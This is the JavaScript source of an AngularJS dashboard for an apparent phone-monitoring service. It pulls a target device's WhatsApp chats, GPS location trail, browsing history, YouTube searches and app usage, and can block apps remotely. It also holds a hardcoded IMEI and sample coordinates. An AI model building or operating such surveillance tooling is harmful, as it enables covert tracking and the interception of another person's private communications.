let app = angular.module("app", ['stringUtil', 'ui.scroll', ]).controller("myCtrl", function($scope, $http, stringUtil,
                                                                                             $timeout, $interval, Server) {

    $scope.aa = [];
    //
    var datasource = {};
    let adapter = {};

    Server.init();





    datasource.get = function (index, count, success) {
        console.log('index = ' + index + '; count = ' + count);

        var start = index;
        var end = Math.min(index + count - 1, Server.first);

        Server.request(start, end).then(success);
        let now = new Date();

        // if(pp)
        // $scope.adapter.reload();
        // pp = !pp;
        //console.log("GET CAGRILDIASDASDASDASDASDASDASD");
    };

    $scope.datasource = datasource;
    //



    $scope.message=["Hello Wdsdorld",'dasdas'];
    $scope.whatsapp = false;
    $scope.whatsappc = false;
    $scope.v = true;
    $scope.w = false;
    $scope.m = false;
    $scope.g = false;
    $scope.y = false;
    $scope.icazeler = false;
    $scope.txt = "asdsd";
    $scope.markers = [];
    $scope.flightPath = null;
    $scope.whatsaps = [];
    $scope.curConversation = null;

    $scope.stringUtil = stringUtil;

    $scope.openc = function(m) {
        //console.log("Openc called");
        console.log(m.con);
        $scope.whatsapp = false;
        $scope.whatsappc = true;
        $scope.v = false;
        $scope.w = false;
        $scope.m = false;
        $scope.g = false;
        $scope.y = false;

        $scope.curConversation = m;
        Server.data = m.con;
        $scope.adapter.reload()


        setTimeout(function () {
            $( "body" ).scrollTop(1000000);
        }, 100);
    }
    $scope.toHour = function(time) {
        let d = new Date(time);
        if(!$scope.stringUtil.isToday(d)) {
            return ((d.getMonth() > 8) ? (d.getMonth() + 1) : ('0' + (d.getMonth() + 1))) + '/' + ((d.getDate() > 9) ? d.getDate() : ('0' + d.getDate())) + '/' + d.getFullYear();
        }
        let h = d.getHours();
        let m = d.getMinutes();

        h = (h<10) ? '0' + h : h;
        m = (m<10) ? '0' + m : m;

        return h + ':' + m;
    }
    $scope.addAlert = function() {
        $scope.alerts.push({msg: 'Another alert!'});
    };
    $scope.openy = function(url) {
        if(!url.startsWith('http')) {
            url = 'http://' + url;
        }
        window.open(url);
    };


    $scope.toDuration = function(d) {

        if(d < 60) {
            return d + " San";
        }else {
            d = $scope.divide(d, 60);
            return d + " Dəq";
        }
    }
    $scope.divide = function(a,b) {
        let ans = a / b;
        return parseInt(ans);
    }
    $scope.closeAlert = function(index) {
        $scope.alerts.splice(index, 1);
    };


    $scope.block = function(a,b,c,d) {
        let block = (c.blocked) ? 0 : 1;
        console.log(b);
        console.log("block status gonderildi " + block)

        $http.get('https://lookin24.com/blockApp?imei='+$scope.d.imei+'&package='+b+'&block='+block).then(function (d) {
            console.log(d.data.apps + " " + $scope.imei);

            c.blocked = c.blocked ^ true;

        }, function () {

        });

    };


    $scope.location = function() {

        console.log("Location Called");

        $http.get('https://lookin24.com/sendCommand?imei=356769106360753&sendLocation=1').then(function (d) {
            console.log(d.data.locations);
            //test data
            d.data.locations = [
                {time: "1586602656081", lo: "10.373508", la: "52.061589"},
                {time: "1586602697465", lo: "10.3742054", la: "52.0623917"},
                {time: "1586602757443", lo: "10.3746074", la: "52.060913"},
                {time: "1586602817456", lo: "10.3751552", la: "52.0575757"},
                {time: "1586602877461", lo: "10.3716101", la: "52.0564132"},
                {time: "1586602937462", lo: "10.3731574", la: "52.052786"},
                {time: "1586602997467", lo: "10.372823", la: "52.0502005"},
                {time: "1586603174063", lo: "10.3739413", la: "52.0510719"},
                {time: "1586604423569", lo: "10.373495", la: "52.0615974"}
            ];
            if(d.data.locations == undefined) {
                return;
            }

            $scope.locations = d.data.locations;

            $scope.locations.reverse();
            if($scope.locations == undefined) {
                console.log("SendCommand Time out" + map);

                return;
            }
            let l = $scope.locations;

            let flightPlanCoordinates = [];

            for(let i = 0; i < $scope.markers.length; i++) {
                $scope.markers[i].setMap(null);
            }
            if($scope.flightPath != null) {
                $scope.flightPath.setMap(null);
            }
            for(let i = 0; i < l.length; i++) {

                console.log("marker added");
                l[i].lo = parseFloat(l[i].lo);
                l[i].la = parseFloat(l[i].la);

                if(i == l.length-1) {
                    map.setCenter({lat: l[i].la, lng: l[i].lo});
                }
                flightPlanCoordinates.push( {lat: l[i].la, lng: l[i].lo});
                let time = $scope.stringUtil.toTime(parseInt(l[i].time));
                time = time.substring(time.length - 5);

                if(true) {
                    let marker = new google.maps.Marker({
                        position: {lat: l[i].la, lng: l[i].lo},
                        map: map,
                        label: {
                            text:  time,
                            color: "#2c3e0f",
                            fontSize: "20px"
                        },
                        draggable:true,
                        icon: {
                            url: 'https://lookin24.com/googlemapicon.png',
                            origin: new google.maps.Point(0, 0),
                            labelOrigin: new google.maps.Point(20, -10)
                        },
                        labelClass:'labels'
                    });
                    $scope.markers.push(marker);
                }
            }

            let lineSymbol = {
                path: 1,
                strokeOpacity: 1
            };
            $scope.flightPath = new google.maps.Polyline({
                path: flightPlanCoordinates,
                // strokeOpacity: 0,
                icons: [{
                    icon: lineSymbol,
                    offset: '100',
                    repeat: '20px',
                }],
                map: map,
                strokeColor: 'rgb(255,0,5)'
            });

            map.panTo(flightPlanCoordinates[flightPlanCoordinates.length]);




        }, function () {

        });

    }

    $scope.Web = function() {

        $http.get('https://lookin24.com/sendCommand?imei=356769106360753&sendWebsites=1').then(function (d) {
            console.log(d.data.data);
            if(d.data.data == undefined) {
                return;
            }

            $scope.websites = d.data.data;
            $scope.websites.reverse();
            if($scope.websites == undefined) {
                console.log("SendCommand Time out");
                return;
            }
        }, function () {

        });

    }
    $scope.whatsappf = function() {


        $http.get('https://lookin24.com/Whatsapp?imei=356769106360753').then(function (d) {
            console.log(d);
            $scope.whatsaps = d.data.con;
            //$scope.adapter.prepend($scope.whatsaps);
            $scope.whatsaps.sort(function (a, b) {
                return b.con[b.con.length - 1].time - a.con[a.con.length - 1].time;
            })
            console.log($scope.whatsaps)
        }, function () {

        });

    }
    $scope.gundelik = function() {

        $http.get('https://lookin24.com/sendCommand?imei=356769106360753').then(function (d) {
            console.log(d.data.data);

            $scope.gunluk = d.data.data;
            if($scope.gunluk == undefined) {
                console.log("SendCommand Time out");
                return;
            }
            let t = [];
            for(let i = 0; i < $scope.aa.length; i++) {
                t[$scope.aa[i].package] = 1;
            }
            let ans = [];
            for(let i = 0; i < $scope.gunluk.length; i++) {
                if(t[$scope.gunluk[i].package] == undefined)continue;
                $scope.gunluk[i].start = parseInt($scope.gunluk[i].start);
                $scope.gunluk[i].end = parseInt($scope.gunluk[i].end);
                $scope.gunluk[i].duration = $scope.gunluk[i].end - $scope.gunluk[i].start;
                $scope.gunluk[i].duration = $scope.divide($scope.gunluk[i].duration, 1000);
                if($scope.gunluk[i].end == -1) {
                    $scope.gunluk[i].end = 9007199254740992;
                    //$scope.gunluk[i] = 9007199254740992;

                }
                ans.push($scope.gunluk[i]);

                console.log($scope.gunluk[i].duration);

            }
            $scope.gunluk = ans;

            $scope.gunluk.sort(function (a,b) {
                return b.end-a.end;
            })

        }, function () {

        });

    }

    $scope.yact = function() {

        $http.get('https://lookin24.com/sendCommand?imei=356769106360753&youtube=1').then(function (d) {
            console.log(d.data.data);
            if(d.data.data == undefined) {
                return;
            }

            $scope.youtubes = d.data.data;
            $scope.youtubes.reverse();
            if($scope.youtubes == undefined) {
                console.log("SendCommand Time out");
                return;
            }
            for(let i = 0; i < $scope.youtubes.length; i++) {
                //https://www.youtube.com/results?search_query=the+show+must+go+on
                $scope.youtubes[i].url = "www.youtube.com/results?search_query=" + encodeURI($scope.youtubes[i].name);
                console.log($scope.youtubes[i].url)
            }
            console.log($scope.youtubes);
        }, function () {

        });

    }
    //$scope.yact();
    //$scope.Web();

    //$scope.aa=[];
    $http.get('https://lookin24.com/getDevice?imei=356769106360753').then(function (d) {
        console.log(d.data.apps);
        if(d.data.apps == undefined) {
            return;
        }
        $scope.d = d.data;
        console.log(d.data.imei);
        $scope.aa = d.data.apps;

        //$scope.adapter.append($scope.aa);








    }, function () {

    });


} )


var loadMe = angular.module('stringUtil',[]);

loadMe.factory('stringUtil', [function(){

    return stringUtil;
}]);

app.factory('Server', [
    '$timeout', '$q', function ($timeout, $q) {

        return {

            max: 100,

            first: 1,

            delay: 100,

            data: [],

            init: function () {
                for (var i = this.first; i <= this.max; i++) {
                    // this.data.push({
                    //     number: i,
                    //     title: 'Message #' + i,
                    //     text: Math.random().toString(36).substring(7)
                    // });
                }
            },

            request: function (start, end) {
                var self = this;
                var deferred = $q.defer();

                $timeout(function () {
                    var result = [];
                    if (start <= end) {
                        for (var i = start; i <= end; i++) {
                            var serverDataIndex = (-1) * i + self.first;
                            //if(serverDataIndex >= 0 && serverDataIndex <= self.data.length)
                            console.log(serverDataIndex)
                            var item = self.data[serverDataIndex];
                            if (item) {
                                result.push(item);
                            }
                        }
                    }
                    deferred.resolve(result);
                }, self.delay);

                return deferred.promise;
            }
        };

    }
]);